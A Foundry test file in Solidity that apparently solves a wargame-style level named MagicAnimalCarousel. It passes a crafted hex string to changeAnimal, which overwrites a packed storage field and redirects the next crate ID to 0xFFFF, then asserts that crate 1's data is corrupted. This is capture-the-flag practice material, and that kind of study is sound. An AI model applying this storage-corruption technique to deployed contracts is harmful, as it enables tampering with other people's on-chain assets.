// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
// import {Test, console} from "forge-std/Test.sol";
import "../lib/forge-std/src/Test.sol";
import "../lib/forge-std/src/console.sol";

import {MagicAnimalCarousel} from "../src/level33/MagicAnimal.sol";

contract MagicAnimalCarouselTest is Test {
    MagicAnimalCarousel carousel;

    function setUp() public {
        // Deploy the contract
        carousel = new MagicAnimalCarousel();
    }

    function testBreakMagicRule() public {
        // Step 1: Add "Dog" to the carousel
        carousel.setAnimalAndSpin("Dog");

        // Verify that "Dog" is in crate 1
        uint256 crate1Data = carousel.carousel(1);

        // Correct mask to extract the animal (upper 80 bits)
        uint256 animalMask = uint256(type(uint80).max) << 176;
        uint256 animalInCrate1 = (crate1Data & animalMask) >> 176; //here also 256-176=80

        // Correct encoding of "Dog" (matches contract logic)
        // uint256 encodedDog = uint256(
        //     keccak256(bytes32(abi.encodePacked("Dog")))
        // ) >> 176; //256-176=80
        uint256 encodedDog = uint256(keccak256(abi.encodePacked("Dog"))) >> 176;

        // Assert that the animal in crate 1 matches the encoded "Dog"
        assertEq(animalInCrate1, encodedDog, "Crate 1 should contain 'Dog'");

        //    // Step 2: Manipulate the next crate ID
        string memory exploitString = string(
            abi.encodePacked(hex"10000000000000000000FFFF")
        );
        carousel.changeAnimal(exploitString, 1);

        // Verify that the next crate ID is now 0xFFFF
        uint256 updatedCrate_1Data = carousel.carousel(1);
        uint256 nextCrateIdMask = uint256(type(uint16).max) << 160; // Mask to extract next crate ID
        uint256 nextCrateId = (updatedCrate_1Data & nextCrateIdMask) >> 160;
        assertEq(nextCrateId, 0xFFFF, "Next crate ID should be 0xFFFF");

        // Step 3: Add "Parrot" to the carousel
        carousel.setAnimalAndSpin("Parrot");

        // Verify that "Parrot" is in crate 65535
        uint256 crate65535Data = carousel.carousel(65535);
        uint256 animalInCrate65535 = (crate65535Data & animalMask) >> 176;
        // uint256 encodedParrot = uint256(
        //     bytes32(abi.encodePacked("Parrot")) >> 176
        // );
        uint256 encodedParrot = uint256(
            keccak256(abi.encodePacked("Parrot"))
        ) >> 176;

        assertEq(
            animalInCrate65535,
            encodedParrot,
            "Crate 65535 should contain 'Parrot'"
        );

        // Step 4: Add "Cat" to the carousel
        carousel.setAnimalAndSpin("Cat");

        // Verify that crate 1 no longer contains "Dog"
        uint256 updatedCrate1Data = carousel.carousel(1);
        uint256 updatedAnimalInCrate1 = (updatedCrate1Data & animalMask) >> 176;
        assertTrue(
            updatedAnimalInCrate1 != encodedDog,
            "Crate 1 should no longer contain 'Dog'"
        );

        // Verify that crate 1 now contains a mangled animal name
        console.log("Animal in crate 1 after exploit:", updatedAnimalInCrate1);
    }
}
